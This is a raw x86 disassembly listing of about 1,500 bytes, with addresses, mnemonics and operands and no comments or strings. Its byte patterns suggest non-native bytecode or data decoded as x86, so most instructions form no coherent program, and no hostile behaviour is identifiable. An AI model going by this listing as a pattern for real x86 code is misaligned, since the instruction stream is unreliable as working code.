  402cc6:	add    BYTE PTR [eax],al
  402cc8:	adc    al,0x0
  402cca:	add    BYTE PTR [ecx],dl
  402ccc:	add    bh,BYTE PTR [ebx+0x3d]
  402ccf:	add    BYTE PTR [eax],al
  402cd1:	add    al,0xa
  402cd3:	push   es
  402cd4:	or     eax,DWORD PTR [edi]
  402cd6:	add    ebp,DWORD PTR [eax]
  402cd8:	data16 add BYTE PTR [eax],al
  402cdb:	or     dh,BYTE PTR [esi+edx*1+0x0]
  402cdf:	add    BYTE PTR [ecx],al
  402ce1:	or     al,0x2
  402ce3:	jl     0x402d22
  402ce5:	add    BYTE PTR [eax],al
  402ce7:	add    al,0x8
  402ce9:	pop    es
  402cea:	sub    BYTE PTR [ecx],al
  402cec:	add    BYTE PTR [eax],al
  402cee:	sub    ecx,DWORD PTR [edx]
  402cf0:	push   es
  402cf1:	pop    es
  402cf2:	xor    ebx,edi
  402cf4:	sub    dh,BYTE PTR [edx]
  402cf6:	add    bh,BYTE PTR [ebx+0x3d]
  402cf9:	add    BYTE PTR [eax],al
  402cfb:	add    al,0x6f
  402cfd:	add    BYTE PTR [bx+si],al
  402d00:	or     ch,BYTE PTR [edx]
  402d02:	push   ds
  402d03:	add    ch,BYTE PTR [eax]
  402d05:	pop    ss
  402d06:	add    BYTE PTR [eax],al
  402d08:	or     ch,BYTE PTR [edx]
  402d0a:	push   es
  402d0b:	sub    bl,BYTE PTR [ebx]
  402d0d:	xor    BYTE PTR [eax+eax*1],al
  402d10:	mov    dh,0x0
  402d12:	add    BYTE PTR [eax],al
  402d14:	adc    eax,0x2110000
  402d19:	jae    0x402ca9
  402d1b:	add    BYTE PTR [eax],al
  402d1d:	push   es
  402d1e:	jge    0x402d5f
  402d20:	add    BYTE PTR [eax],al
  402d22:	add    al,0x2
  402d24:	sub    BYTE PTR [edi],dl
  402d26:	add    BYTE PTR [eax],al
  402d28:	or     dl,BYTE PTR [esi]
  402d2a:	or     eax,0x3e7e
  402d2f:	add    al,0x25
  402d31:	adc    eax,DWORD PTR [edx+edx*1]
  402d34:	add    ebp,DWORD PTR [eax]
  402d36:	push   0x7e0a0000
  402d3b:	imul   eax,DWORD PTR [eax],0x6f140a00
  402d41:	push   0x0
  402d43:	add    BYTE PTR [edx],cl
  402d45:	fimul  WORD PTR [ebx]
  402d47:	or     DWORD PTR [edi+eax*1],ebp
  402d4a:	adc    DWORD PTR [eax+ebp*1],eax
  402d4d:	imul   eax,DWORD PTR [eax],0x0
  402d50:	or     bl,ah
  402d52:	add    ch,BYTE PTR [eax]
  402d54:	push   esp
  402d55:	add    BYTE PTR [eax],al
  402d57:	or     ch,BYTE PTR [edi+0x2]
  402d5a:	add    BYTE PTR [eax],al
  402d5c:	sub    edi,DWORD PTR [ebp+0x41]
  402d5f:	add    BYTE PTR [eax],al
  402d61:	add    al,0x2
  402d63:	jnp    0x402da6
  402d65:	add    BYTE PTR [eax],al
  402d67:	add    al,0x74
  402d69:	data16 add BYTE PTR [eax],al
  402d6c:	add    DWORD PTR [edx],ecx
  402d6e:	push   es
  402d6f:	jle    0x402dde
  402d71:	add    BYTE PTR [eax],al
  402d73:	or     ch,BYTE PTR [edi+0x6e]
  402d76:	add    BYTE PTR [eax],al
  402d78:	or     al,BYTE PTR [edx]
  402d7a:	jnp    0x402dbd
  402d7c:	add    BYTE PTR [eax],al
  402d7e:	add    al,0x2
  402d80:	jnp    0x402dc1
  402d82:	add    BYTE PTR [eax],al
  402d84:	add    al,0x73
  402d86:	dec    ebp
  402d87:	add    BYTE PTR [eax],al
  402d89:	push   es
  402d8a:	or     eax,DWORD PTR [edi]
  402d8c:	jae    0x402dfd
  402d8e:	add    BYTE PTR [eax],al
  402d90:	or     cl,BYTE PTR [eax+ecx*1]
  402d93:	outs   dx,DWORD PTR ds:[esi]
  402d94:	jo     0x402d96
  402d96:	add    BYTE PTR [edx],cl
  402d98:	or     BYTE PTR [esi+0x42],bh
  402d9b:	add    BYTE PTR [eax],al
  402d9d:	add    al,0x2d
  402d9f:	adc    DWORD PTR [esi+edi*8],edx
  402da2:	push   es
  402da3:	jle    0x402da5
  402da5:	add    BYTE PTR [esi],al
  402da7:	jae    0x402e1a
  402da9:	add    BYTE PTR [eax],al
  402dab:	or     al,BYTE PTR [eax+0x4000042]
  402db1:	jle    0x402df5
  402db3:	add    BYTE PTR [eax],al
  402db5:	add    al,0x6f
  402db7:	jb     0x402db9
  402db9:	add    BYTE PTR [edx],cl
  402dbb:	or     BYTE PTR [ebx+0x73],dh
  402dbe:	add    BYTE PTR [eax],al
  402dc0:	or     ch,BYTE PTR [edi+0x74]
  402dc3:	add    BYTE PTR [eax],al
  402dc5:	or     al,BYTE PTR [edx]
  402dc7:	or     BYTE PTR [ebp+0x40],bh
  402dca:	add    BYTE PTR [eax],al
  402dcc:	add    al,0x2a
  402dce:	add    BYTE PTR [eax],al
  402dd0:	add    DWORD PTR [eax],edx
  402dd2:	add    BYTE PTR [eax],al
  402dd4:	add    al,BYTE PTR [eax]
  402dd6:	adc    eax,DWORD PTR [eax]
  402dd8:	sbb    al,0x2f
  402dda:	add    BYTE PTR [ebx],cl
  402ddc:	add    BYTE PTR [eax],al
  402dde:	add    BYTE PTR [eax],al
  402de0:	xor    al,BYTE PTR [edx]
  402de2:	jnp    0x402e24
  402de4:	add    BYTE PTR [eax],al
  402de6:	add    al,0x6f
  402de8:	jne    0x402dea
  402dea:	add    BYTE PTR [edx],cl
  402dec:	sub    dh,BYTE PTR [edx]
  402dee:	add    bh,BYTE PTR [ebx+0x40]
  402df1:	add    BYTE PTR [eax],al
  402df3:	add    al,0x6f
  402df5:	jbe    0x402df7
  402df7:	add    BYTE PTR [edx],cl
  402df9:	sub    ah,BYTE PTR [edx+0x2]
  402dfc:	sub    BYTE PTR [edi+0x0],ah
  402dff:	add    BYTE PTR [esi],al
  402e01:	add    bh,BYTE PTR [ebx+0x40]
  402e04:	add    BYTE PTR [eax],al
  402e06:	add    al,0x3
  402e08:	sub    BYTE PTR [edi+0x0],dh
  402e0b:	add    BYTE PTR [edx],cl
  402e0d:	outs   dx,DWORD PTR ds:[esi]
  402e0e:	js     0x402e10
  402e10:	add    BYTE PTR [edx],cl
  402e12:	sub    al,BYTE PTR [eax]
  402e14:	adc    esi,DWORD PTR [eax]
  402e16:	add    DWORD PTR [eax],eax
  402e18:	sbb    DWORD PTR [eax],eax
  402e1a:	add    BYTE PTR [eax],al
  402e1c:	push   ss
  402e1d:	add    BYTE PTR [eax],al
  402e1f:	adc    DWORD PTR [edx],eax
  402e21:	sub    BYTE PTR [edi+0x0],ah
  402e24:	add    BYTE PTR [esi],al
  402e26:	add    bh,BYTE PTR [ebx+0x40]
  402e29:	add    BYTE PTR [eax],al
  402e2b:	add    al,0x6f
  402e2d:	jns    0x402e2f
  402e2f:	add    BYTE PTR [edx],cl
  402e31:	or     al,BYTE PTR [esi]
  402e33:	sub    BYTE PTR [edx+0x0],bh
  402e36:	add    BYTE PTR [edx],cl
  402e38:	sub    al,BYTE PTR [eax]
  402e3a:	add    BYTE PTR [eax],al
  402e3c:	adc    esi,DWORD PTR [eax]
  402e3e:	add    al,BYTE PTR [eax]
  402e40:	cmp    al,BYTE PTR [eax]
  402e42:	add    BYTE PTR [eax],al
  402e44:	pop    ss
  402e45:	add    BYTE PTR [eax],al
  402e47:	adc    DWORD PTR [edx],eax
  402e49:	sub    BYTE PTR [edi+0x0],ah
  402e4c:	add    BYTE PTR [esi],al
  402e4e:	add    bh,BYTE PTR [ebx+0x40]
  402e51:	add    BYTE PTR [eax],al
  402e53:	add    al,0x6f
  402e55:	jnp    0x402e57
  402e57:	add    BYTE PTR [edx],cl
  402e59:	or     dl,BYTE PTR [ebx+ecx*1]
  402e5c:	push   es
  402e5d:	sub    al,0x1c
  402e5f:	jae    0x402edd
  402e61:	add    BYTE PTR [eax],al
  402e63:	or     cl,BYTE PTR [ebx]
  402e65:	sub    ecx,DWORD PTR [edi+eax*1]
  402e68:	push   es
  402e69:	outs   dx,DWORD PTR ds:[esi]
  402e6a:	jge    0x402e6c
  402e6c:	add    BYTE PTR [edx],cl
  402e6e:	outs   dx,DWORD PTR ds:[esi]
  402e6f:	jle    0x402e71
  402e71:	add    BYTE PTR [edx],cl
  402e73:	push   es
  402e74:	outs   dx,DWORD PTR ds:[esi]
  402e75:	push   ebx
  402e76:	add    BYTE PTR [eax],al
  402e78:	or     ch,BYTE PTR ds:0x7a2807ec
  402e7e:	add    BYTE PTR [eax],al
  402e80:	or     ch,BYTE PTR [edx]
  402e82:	add    BYTE PTR [eax],al
  402e84:	adc    esi,DWORD PTR [eax]
  402e86:	add    DWORD PTR [eax],eax
  402e88:	sbb    DWORD PTR [eax],eax
  402e8a:	add    BYTE PTR [eax],al
  402e8c:	sbb    BYTE PTR [eax],al
  402e8e:	add    BYTE PTR [ecx],dl
  402e90:	add    ch,BYTE PTR [eax]
  402e92:	add    BYTE PTR [bx+si],al
  402e95:	push   es
  402e96:	add    bh,BYTE PTR [ebx+0x40]
  402e99:	add    BYTE PTR [eax],al
  402e9b:	add    al,0x6f
  402e9d:	jg     0x402e9f
  402e9f:	add    BYTE PTR [edx],cl
  402ea1:	or     al,BYTE PTR [esi]
  402ea3:	sub    BYTE PTR [edx+0x0],bh
  402ea6:	add    BYTE PTR [edx],cl
  402ea8:	sub    cl,BYTE PTR [esi+0x2]
  402eab:	sub    BYTE PTR [edi+0x0],ah
  402eae:	add    BYTE PTR [esi],al
  402eb0:	add    bh,BYTE PTR [ebx+0x40]
  402eb3:	add    BYTE PTR [eax],al
  402eb5:	add    al,0x6f
  402eb7:	add    BYTE PTR [eax],0x0
  402eba:	or     ah,BYTE PTR [esi]
  402ebc:	sub    cl,BYTE PTR [edx+0x2]
  402ebf:	sub    BYTE PTR [edi+0x0],ah
  402ec2:	add    BYTE PTR [esi],al
  402ec4:	add    bh,BYTE PTR [ebx+0x40]
  402ec7:	add    BYTE PTR [eax],al
  402ec9:	add    al,0x6f
  402ecb:	add    DWORD PTR [eax],0x132a0a00
  402ed1:	xor    BYTE PTR [edx],al
  402ed3:	add    BYTE PTR [edi],bl
  402ed5:	add    BYTE PTR [eax],al
  402ed7:	add    BYTE PTR [ecx],bl
  402ed9:	add    BYTE PTR [eax],al
  402edb:	adc    DWORD PTR [edx],eax
  402edd:	sub    BYTE PTR [edi+0x0],ah
  402ee0:	add    BYTE PTR [esi],al
  402ee2:	add    ebp,DWORD PTR [eax]
  402ee4:	pop    esi
  402ee5:	add    BYTE PTR [eax],al
  402ee7:	or     dh,BYTE PTR [ecx+esi*2+0x0]
  402eeb:	add    BYTE PTR [ecx],al
  402eed:	or     al,BYTE PTR [edx]
  402eef:	jnp    0x402f31
  402ef1:	add    BYTE PTR [eax],al
  402ef3:	add    al,0x6
  402ef5:	outs   dx,DWORD PTR ds:[esi]
  402ef6:	add    BYTE PTR [eax],0x0
  402ef9:	or     ch,BYTE PTR [edx]
  402efb:	add    BYTE PTR [ebx],dl
  402efd:	xor    BYTE PTR [edx],al
  402eff:	add    BYTE PTR [edx],bl
  402f01:	add    BYTE PTR [eax],al
  402f03:	add    BYTE PTR [edx],bl
  402f05:	add    BYTE PTR [eax],al
  402f07:	adc    DWORD PTR [edx],eax
  402f09:	sub    BYTE PTR [edi+0x0],ah
  402f0c:	add    BYTE PTR [esi],al
  402f0e:	add    bh,BYTE PTR [ebx+0x40]
  402f11:	add    BYTE PTR [eax],al
  402f13:	add    al,0x3
  402f15:	outs   dx,DWORD PTR ds:[esi]
  402f16:	add    DWORD PTR [eax],0x0
  402f19:	or     cl,BYTE PTR [edx]
  402f1b:	push   es
  402f1c:	sub    BYTE PTR [edx+0x0],bh
  402f1f:	add    BYTE PTR [edx],cl
  402f21:	sub    al,BYTE PTR [eax]
  402f23:	add    BYTE PTR [ebx],dl
  402f25:	xor    BYTE PTR [edx],al
  402f27:	add    BYTE PTR [edi],bl
  402f29:	add    BYTE PTR [eax],al
  402f2b:	add    BYTE PTR [ebx],bl
  402f2d:	add    BYTE PTR [eax],al
  402f2f:	adc    DWORD PTR [edx],eax
  402f31:	sub    BYTE PTR [edi+0x0],ah
  402f34:	add    BYTE PTR [esi],al
  402f36:	add    ebp,DWORD PTR [eax]
  402f38:	pop    esi
  402f39:	add    BYTE PTR [eax],al
  402f3b:	or     dh,BYTE PTR [edx+ecx*1+0x0]
  402f3f:	add    BYTE PTR [ebx],bl
  402f41:	or     al,BYTE PTR [edx]
  402f43:	jnp    0x402f85
  402f45:	add    BYTE PTR [eax],al
  402f47:	add    al,0x6
  402f49:	outs   dx,DWORD PTR ds:[esi]
  402f4a:	test   BYTE PTR [eax],al
  402f4c:	add    BYTE PTR [edx],cl
  402f4e:	sub    bl,BYTE PTR [esi]
  402f50:	add    ch,BYTE PTR [eax]
  402f52:	pop    ss
  402f53:	add    BYTE PTR [eax],al
  402f55:	or     ch,BYTE PTR [edx]
  402f57:	xchg   edx,eax
  402f58:	add    al,BYTE PTR [edx]
  402f5a:	jnp    0x402fc1
  402f5c:	add    BYTE PTR [eax],al
  402f5e:	add    al,0x2
  402f60:	jnp    0x402fc8
  402f62:	add    BYTE PTR [eax],al
  402f64:	add    al,0x2
  402f66:	jnp    0x402fcf
  402f68:	add    BYTE PTR [eax],al
  402f6a:	add    al,0x2
  402f6c:	jnp    0x402fd6
  402f6e:	add    BYTE PTR [eax],al
  402f70:	add    al,0x28
  402f72:	jb     0x402f74
  402f74:	add    BYTE PTR [esi],al
  402f76:	jge    0x402fdc
  402f78:	add    BYTE PTR [eax],al
  402f7a:	add    al,0x2a
  402f7c:	adc    esi,DWORD PTR [eax]
  402f7e:	add    al,0x0
  402f80:	dec    ebp
  402f81:	add    BYTE PTR [eax],al
  402f83:	add    BYTE PTR [eax+eax*1],bl
  402f86:	add    BYTE PTR [ecx],dl
  402f88:	jae    0x402f27
  402f8a:	add    BYTE PTR [eax],al
  402f8c:	push   es
  402f8d:	or     al,BYTE PTR [esi]
  402f8f:	add    edi,DWORD PTR [ebp+0x66]
  402f92:	add    BYTE PTR [eax],al
  402f94:	add    al,0x6
  402f96:	add    al,0x7d
  402f98:	add    BYTE PTR [bx+si],al
  402f9b:	add    al,0x6
  402f9d:	add    eax,0x687d
  402fa2:	add    al,0x6
  402fa4:	add    bh,BYTE PTR [ebp+0x65]
  402fa7:	add    BYTE PTR [eax],al
  402fa9:	add    al,0x2
  402fab:	sub    BYTE PTR [edi+0x0],ah
  402fae:	add    BYTE PTR [esi],al
  402fb0:	push   es
  402fb1:	adc    al,0x7d
  402fb3:	add    BYTE PTR fs:[eax],al
  402fb6:	add    al,0x2
  402fb8:	jnp    0x402ff9
  402fba:	add    BYTE PTR [eax],al
  402fbc:	add    al,0x6
  402fbe:	inc    BYTE PTR [esi]
  402fc0:	sahf   
  402fc1:	add    BYTE PTR [eax],al
  402fc3:	push   es
  402fc4:	jae    0x402ff7
  402fc6:	add    BYTE PTR [eax],al
  402fc8:	or     ch,BYTE PTR [edi-0x73]
  402fcb:	add    BYTE PTR [eax],al
  402fcd:	push   es
  402fce:	push   es
  402fcf:	jnp    0x403035
  402fd1:	add    BYTE PTR [eax],al
  402fd3:	add    al,0x2a
  402fd5:	push   ds
  402fd6:	add    ch,BYTE PTR [eax]
  402fd8:	pop    ss
  402fd9:	add    BYTE PTR [eax],al
  402fdb:	or     ch,BYTE PTR [edx]
  402fdd:	add    BYTE PTR [eax],al
  402fdf:	add    BYTE PTR [ebx],dl
  402fe1:	xor    BYTE PTR [edi],al
  402fe3:	add    BYTE PTR [ecx],bh
  402fe5:	add    BYTE PTR [eax],al
  402fe7:	add    BYTE PTR ds:0xe110000,bl
  402fed:	push   es
  402fee:	sub    al,0x5
  402ff0:	push   cs
  402ff1:	push   es
  402ff2:	sbb    DWORD PTR [ebx],esi
  402ff4:	sub    al,BYTE PTR [edx]
  402ff6:	jnp    0x403062
  402ff8:	add    BYTE PTR [eax],al
  402ffa:	add    al,0x2
  402ffc:	jnp    0x403067
  402ffe:	add    BYTE PTR [eax],al
  403000:	add    al,0x28
  403002:	jge    0x403004
  403004:	add    BYTE PTR [esi],al
  403006:	jae    0x402f8d
  403008:	add    BYTE PTR [eax],al
  40300a:	or     cl,BYTE PTR [edx]
  40300c:	add    al,BYTE PTR [ebx]
  40300e:	add    al,0x5
  403010:	push   cs
  403011:	add    al,0x6
  403013:	jae    0x402f95
  403015:	add    BYTE PTR [eax],al
  403017:	push   es
  403018:	jge    0x403083
  40301a:	add    BYTE PTR [eax],al
  40301c:	add    al,0x6
  40301e:	sub    dh,BYTE PTR [ebx-0x7b]
  403021:	add    BYTE PTR [eax],al
  403023:	or     ch,BYTE PTR [edx]
  403025:	add    BYTE PTR [eax],al
  403027:	add    BYTE PTR [ebx],dl
  403029:	xor    BYTE PTR [edi],al
  40302b:	add    BYTE PTR [esi+0x0],al
  40302e:	add    BYTE PTR [eax],al
  403030:	push   ds
  403031:	add    BYTE PTR [eax],al
  403033:	adc    DWORD PTR [ebx-0x61],esi
  403036:	add    BYTE PTR [eax],al
  403038:	push   es
  403039:	or     al,0x8
  40303b:	add    bh,BYTE PTR [ebp+0x6a]
  40303e:	add    BYTE PTR [eax],al
  403040:	add    al,0x8
  403042:	adc    al,0x7d
  403044:	imul   eax,DWORD PTR [eax],0xfe080400
  40304a:	push   es
  40304b:	mov    al,ds:0x73060000
  403050:	xchg   BYTE PTR [eax],al
  403052:	add    BYTE PTR [edx],cl
  403054:	or     al,BYTE PTR [edx]
  403056:	jnp    0x403098
  403058:	add    BYTE PTR [eax],al
  40305a:	add    al,0x3
  40305c:	add    al,0x5
  40305e:	pop    ss
  40305f:	adc    al,0x6
  403061:	outs   dx,DWORD PTR ds:[esi]
  403062:	xchg   DWORD PTR [eax],eax
  403064:	add    BYTE PTR [edx],cl
  403066:	or     eax,DWORD PTR [edx]
  403068:	or     BYTE PTR [ebx+0x69],bh
  40306b:	add    BYTE PTR [eax],al
  40306d:	add    al,0x28
  40306f:	jge    0x403071
  403071:	add    BYTE PTR [esi],al
  403073:	pop    es
  403074:	sub    BYTE PTR [edx+0x0],bh
  403077:	add    BYTE PTR [edx],cl
  403079:	sub    bl,BYTE PTR [esi+0x2]
  40307c:	sub    BYTE PTR [edi+0x0],ah
  40307f:	add    BYTE PTR [esi],al
  403081:	add    bh,BYTE PTR [ebx+0x40]
  403084:	add    BYTE PTR [eax],al
  403086:	add    al,0x3
  403088:	add    al,0x5
  40308a:	push   cs
  40308b:	add    al,0x6f
  40308d:	mov    BYTE PTR [eax],al
  40308f:	add    BYTE PTR [edx],cl
  403091:	sub    cl,BYTE PTR [esi+0x2]
  403094:	sub    BYTE PTR [edi+0x0],ah
  403097:	add    BYTE PTR [esi],al
  403099:	add    bh,BYTE PTR [ebx+0x40]
  40309c:	add    BYTE PTR [eax],al
  40309e:	add    al,0x3
  4030a0:	outs   dx,DWORD PTR ds:[esi]
  4030a1:	mov    DWORD PTR [eax],eax
  4030a3:	add    BYTE PTR [edx],cl
  4030a5:	sub    dl,BYTE PTR [edx+0x2]
  4030a8:	sub    BYTE PTR [edi+0x0],ah
  4030ab:	add    BYTE PTR [esi],al
  4030ad:	add    bh,BYTE PTR [ebx+0x40]
  4030b0:	add    BYTE PTR [eax],al
  4030b2:	add    al,0x3
  4030b4:	add    al,0x6f
  4030b6:	mov    al,BYTE PTR [eax]
  4030b8:	add    BYTE PTR [edx],cl
  4030ba:	sub    cl,BYTE PTR [esi+0x2]
  4030bd:	sub    BYTE PTR [edi+0x0],ah
  4030c0:	add    BYTE PTR [esi],al
  4030c2:	add    bh,BYTE PTR [ebx+0x40]
  4030c5:	add    BYTE PTR [eax],al
  4030c7:	add    al,0x3
  4030c9:	outs   dx,DWORD PTR ds:[esi]
  4030ca:	mov    eax,DWORD PTR [eax]
  4030cc:	add    BYTE PTR [edx],cl
  4030ce:	sub    al,BYTE PTR [eax]
  4030d0:	adc    esi,DWORD PTR [eax]
  4030d2:	push   es
  4030d3:	add    BYTE PTR [edi],ch
  4030d5:	add    BYTE PTR [eax],al
  4030d7:	add    BYTE PTR [edi],bl
  4030d9:	add    BYTE PTR [eax],al
  4030db:	adc    DWORD PTR [edx],eax
  4030dd:	sub    BYTE PTR [edi+0x0],ah
  4030e0:	add    BYTE PTR [esi],al
  4030e2:	sar    BYTE PTR [ecx+0x0],1
  4030e5:	add    BYTE PTR [ecx],al
  4030e7:	sub    BYTE PTR [esi],ah
  4030e9:	add    BYTE PTR [eax],al
  4030eb:	or     al,BYTE PTR ds:0x8c28
  4030f1:	or     ah,BYTE PTR [ebp+0x1000079]
  4030f7:	or     al,BYTE PTR [edx]
  4030f9:	jnp    0x40313b
  4030fb:	add    BYTE PTR [eax],al
  4030fd:	add    al,0x3
  4030ff:	add    al,0x6
  403101:	push   cs
  403102:	add    al,0xe
  403104:	add    eax,0x8d6f
  403109:	or     ch,BYTE PTR [edx]
  40310b:	push   esi
  40310c:	add    ch,BYTE PTR [eax]
  40310e:	add    BYTE PTR [bx+si],al
  403111:	push   es
  403112:	add    bh,BYTE PTR [ebx+0x40]
  403115:	add    BYTE PTR [eax],al
  403117:	add    al,0x3
  403119:	add    al,0x5
  40311b:	outs   dx,DWORD PTR ds:[esi]
  40311c:	mov    es,WORD PTR [eax]
  40311e:	add    BYTE PTR [edx],cl
  403120:	sub    al,BYTE PTR [eax]
  403122:	add    BYTE PTR [eax],al
  403124:	adc    esi,DWORD PTR [eax]
  403126:	add    eax,DWORD PTR [eax]
  403128:	pop    ds
  403129:	add    BYTE PTR [eax],al
  40312b:	add    BYTE PTR [eax],ah
  40312d:	add    BYTE PTR [eax],al
  40312f:	adc    DWORD PTR [edx],eax
  403131:	sub    BYTE PTR [edi+0x0],ah
  403134:	add    BYTE PTR [esi],al
  403136:	add    bh,BYTE PTR [ebx+0x40]
  403139:	add    BYTE PTR [eax],al
  40313b:	add    al,0x3
  40313d:	adc    al,BYTE PTR [eax]
  40313f:	outs   dx,DWORD PTR ds:[esi]
  403140:	pop    DWORD PTR [eax]
  403142:	add    BYTE PTR [edx],cl
  403144:	or     eax,DWORD PTR [esi+eax*1]
  403147:	sub    BYTE PTR [edx+0x0],bh
  40314a:	add    BYTE PTR [edx],cl
  40314c:	push   ecx
  40314d:	pop    es
  40314e:	sub    cl,BYTE PTR [edx+0x2]
  403151:	sub    BYTE PTR [edi+0x0],ah
  403154:	add    BYTE PTR [esi],al
  403156:	add    bh,BYTE PTR [ebx+0x40]
  403159:	add    BYTE PTR [eax],al
  40315b:	add    al,0x6f
  40315d:	nop
  40315e:	add    BYTE PTR [eax],al
  403160:	or     ch,BYTE PTR [edx]
  403162:	dec    esi
  403163:	add    ch,BYTE PTR [eax]
  403165:	add    BYTE PTR [bx+si],al
  403168:	push   es
  403169:	add    bh,BYTE PTR [ebx+0x3f]
  40316c:	add    BYTE PTR [eax],al
  40316e:	add    al,0x3
  403170:	outs   dx,DWORD PTR ds:[esi]
  403171:	mov    eax,DWORD PTR [eax]
  403173:	add    BYTE PTR [esi],al
  403175:	sub    al,BYTE PTR [esi]
  403177:	sub    bl,BYTE PTR [esi]
  403179:	add    ch,BYTE PTR [eax]
  40317b:	pop    ss
  40317c:	add    BYTE PTR [eax],al
  40317e:	or     ch,BYTE PTR [edx]
  403180:	sbb    esi,DWORD PTR [eax]
  403182:	push   es
  403183:	add    BYTE PTR [esi+0x0],bh
  403186:	add    BYTE PTR [eax],al
  403188:	and    DWORD PTR [eax],eax
  40318a:	add    BYTE PTR [ecx],dl
  40318c:	add    bh,BYTE PTR [ebx+0x6c]
  40318f:	add    BYTE PTR [eax],al
  403191:	add    al,0x6f
  403193:	mov    DWORD PTR [eax],eax
  403195:	add    BYTE PTR [esi],al
  403197:	or     al,BYTE PTR [esi]
  403199:	push   ss
  40319a:	push   0x6f
  40319c:	xchg   ecx,eax
  40319d:	add    BYTE PTR [eax],al
  40319f:	or     al,BYTE PTR [esi]
  4031a1:	outs   dx,DWORD PTR ds:[esi]
  4031a2:	xchg   edx,eax
  4031a3:	add    BYTE PTR [eax],al
  4031a5:	or     dl,ah
  4031a7:	lea    edi,[edx+0x0]
  4031aa:	add    BYTE PTR [ecx],al
  4031ac:	or     eax,DWORD PTR [esi]
  4031ae:	pop    es
  4031af:	push   ss
  4031b0:	pop    es
  4031b1:	mov    gs,WORD PTR [ecx+0x6f]
  4031b4:	xchg   ebx,eax
  4031b5:	add    BYTE PTR [eax],al
  4031b7:	or     ah,BYTE PTR [esi]
  4031b9:	add    bh,BYTE PTR [ebx+0x6c]
  4031bc:	add    BYTE PTR [eax],al
  4031be:	add    al,0x6f
  4031c0:	test   DWORD PTR [eax],eax
  4031c2:	add    BYTE PTR [esi],al
  4031c4:	sub    BYTE PTR [edx+0x0],bh
  4031c7:	add    BYTE PTR [edx],cl
  4031c9:	or     al,0x2
  4031cb:	jnp    0x403238
  4031cd:	add    BYTE PTR [eax],al
  4031cf:	add    al,0x7b
  4031d1:	inc    ecx
  4031d2:	add    BYTE PTR [eax],al
  4031d4:	add    al,0x2
  4031d6:	jnp    0x403244
  4031d8:	add    BYTE PTR [eax],al
  4031da:	add    al,0x6f
  4031dc:	add    DWORD PTR [eax],0x7b020600
  4031e2:	ins    BYTE PTR es:[edi],dx
  4031e3:	add    BYTE PTR [eax],al
  4031e5:	add    al,0x6f
  4031e7:	add    DWORD PTR [eax],0x0
  4031ea:	push   es
  4031eb:	or     BYTE PTR [edx],al
  4031ed:	jnp    0x40325b
  4031ef:	add    BYTE PTR [eax],al
  4031f1:	add    al,0x6f
  4031f3:	xchg   DWORD PTR [eax],eax
  4031f5:	add    BYTE PTR [esi],al
  4031f7:	pop    es
  4031f8:	outs   dx,DWORD PTR ds:[esi]
  4031f9:	dec    esp
  4031fa:	add    BYTE PTR [eax],al
  4031fc:	push   es
  4031fd:	fimul  WORD PTR [edx]
  4031ff:	push   es
  403200:	sub    al,0x6
  403202:	push   es
  403203:	outs   dx,DWORD PTR ds:[esi]
  403204:	inc    edi
  403205:	add    BYTE PTR [eax],al
  403207:	or     bl,ah
  403209:	sub    al,BYTE PTR [eax]
  40320b:	add    BYTE PTR [ecx],al
  40320d:	adc    BYTE PTR [eax],al
  40320f:	add    BYTE PTR [edx],al
  403211:	add    BYTE PTR [eax+eax*1],cl
  403214:	addr16 jae 0x403217
  403217:	or     al,BYTE PTR [eax]
  403219:	add    BYTE PTR [eax],al
  40321b:	add    BYTE PTR [ebx],dl
  40321d:	xor    BYTE PTR [eax+eax*1],al
  403220:	add    BYTE PTR ss:[eax],al
  403223:	add    BYTE PTR [edx],ah
  403225:	add    BYTE PTR [eax],al
  403227:	adc    DWORD PTR [ebx-0x5f],esi
  40322a:	add    BYTE PTR [eax],al
  40322c:	push   es
  40322d:	or     al,BYTE PTR [esi]
  40322f:	add    edi,DWORD PTR [ebp+0x6c]
  403232:	add    BYTE PTR [eax],al
  403234:	add    al,0x6
  403236:	add    bh,BYTE PTR [ebp+0x6b]
  403239:	add    BYTE PTR [eax],al
  40323b:	add    al,0x6
  40323d:	jnp    0x4032ab
  40323f:	add    BYTE PTR [eax],al
  403241:	add    al,0x2d
  403243:	add    DWORD PTR [edx],ebp
  403245:	add    bh,BYTE PTR [ebx+0x3f]
  403248:	add    BYTE PTR [eax],al
  40324a:	add    al,0x6
  40324c:	inc    BYTE PTR [esi]
  40324e:	mov    ds:0x73060000,al
  403253:	xor    DWORD PTR [eax],eax
  403255:	add    BYTE PTR [edx],cl
  403257:	push   ss
  403258:	outs   dx,DWORD PTR ds:[esi]
  403259:	mov    WORD PTR [eax],es
  40325b:	add    BYTE PTR [esi],al
  40325d:	sub    ch,BYTE PTR [esi]
  40325f:	jae    0x403278
  403261:	add    BYTE PTR [eax],al
  403263:	or     al,BYTE PTR [eax+0x400003e]
  403269:	sub    dh,BYTE PTR [edx+0x172802]
  40326f:	add    BYTE PTR [edx],cl
  403271:	add    al,BYTE PTR [ebx]
  403273:	sub    BYTE PTR [edx+0x2060000],al
  403279:	add    al,0x28
  40327b:	test   BYTE PTR [eax],al
  40327d:	add    BYTE PTR [esi],al
  40327f:	add    al,BYTE PTR ds:0x8628
  403285:	push   es
  403286:	add    cl,BYTE PTR [esi]
  403288:	add    al,0x28
  40328a:	mov    BYTE PTR [eax],al
  40328c:	add    BYTE PTR [esi],al
  40328e:	add    cl,BYTE PTR [esi]
  403290:	add    eax,0x8a28
  403295:	push   es
  403296:	sub    bl,BYTE PTR [esi]
  403298:	add    bh,BYTE PTR [ebx+0x43]
  40329b:	add    BYTE PTR [eax],al
  40329d:	add    al,0x2a
  40329f:	and    al,BYTE PTR [edx]
  4032a1:	add    edi,DWORD PTR [ebp+0x43]
  4032a4:	add    BYTE PTR [eax],al
  4032a6:	add    al,0x2a
  4032a8:	push   ds
  4032a9:	add    bh,BYTE PTR [ebx+0x44]
  4032ac:	add    BYTE PTR [eax],al
  4032ae:	add    al,0x2a
  4032b0:	and    al,BYTE PTR [edx]
  4032b2:	add    edi,DWORD PTR [ebp+0x44]
  4032b5:	add    BYTE PTR [eax],al
  4032b7:	add    al,0x2a
  4032b9:	push   ds
  4032ba:	add    bh,BYTE PTR [ebx+0x45]
  4032bd:	add    BYTE PTR [eax],al
  4032bf:	add    al,0x2a
  4032c1:	and    al,BYTE PTR [edx]
  4032c3:	add    edi,DWORD PTR [ebp+0x45]
  4032c6:	add    BYTE PTR [eax],al
  4032c8:	add    al,0x2a
  4032ca:	push   ds
  4032cb:	add    bh,BYTE PTR [ebx+0x46]
  4032ce:	add    BYTE PTR [eax],al
  4032d0:	add    al,0x2a
  4032d2:	and    al,BYTE PTR [edx]
  4032d4:	add    edi,DWORD PTR [ebp+0x46]
